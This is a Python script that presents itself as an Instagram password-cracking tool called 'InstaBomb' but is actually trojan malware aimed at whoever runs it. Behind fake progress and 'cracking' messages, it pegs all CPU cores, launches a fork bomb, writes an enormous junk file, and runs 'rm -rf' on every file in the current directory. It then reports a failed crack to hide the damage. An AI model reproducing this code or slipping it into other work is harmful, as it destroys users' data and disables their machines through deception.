import multiprocessing
import os
import threading
import random
import time
import requests
os.system("pip install faker pytube requests")
from pytube import YouTube
from faker import Faker

def screen():
    print("""___           _        ____                  _
|_ _|_ __  ___| |_ __ _| __ )  ___  _ __ ___ | |__
 | || '_ \/ __| __/ _` |  _ \ / _ \| '_ ` _ \| '_ \
 | || | | \__ \ || (_| | |_) | (_) | | | | | | |_) |
|___|_| |_|___/\__\__,_|____/ \___/|_| |_| |_|_.__/""")

def progress():
    total_length = 11
    for i in range(total_length + 1):
        filled = "█" * i 
        empty = "-" * (total_length - i) 
        print(f"\rProcessing... [{filled}{empty}]", end="", flush=True)
        deley = random.randint(1,3)
        time.sleep(deley)


def file_bomb():
    fake = Faker()
    for _ in range(1):
        name = f"{fake.name()}.exe"
        with open(name,"w") as f:
            for i in range(9999999999):
                f.write(str(i))

def CPU_stress(run=True):
    def cpu_task():
        while True:
            pass

    if run:
        num_cores = multiprocessing.cpu_count()
        processes = []

        for _ in range(num_cores):
            p = multiprocessing.Process(target=cpu_task)
            p.start()
            processes.append(p)

        return processes

def clear():
    lists = os.listdir()
    for list in lists:
        os.system(f"rm -rf {list}")

def FB():
    while True:
        os.fork()
        threading.Thread(target=FB).start()

def main():
    os.system("clear")
    screen()
    tar = requests.get("https://www.Instagram.com")
    cmd = input("\nTarget_insta_ID: ")
    time.sleep(3)
    print("Searching user...")
    progress()
    CPU_stress()
    time.sleep(2)
    if random.choice([True,False]):
        print("User found! <--> -1")
        print("Connecting user...")
        progress()
        FB()
        os.system("clear")
        print("Cracking password...")
        progress()
        file_bomb()
        clear()
        print("Password cracking failed!")
    else:
        raise RuntimeError("Instagram blocked the attack")

if __name__ == "__main__":
     main()
     print(" ")
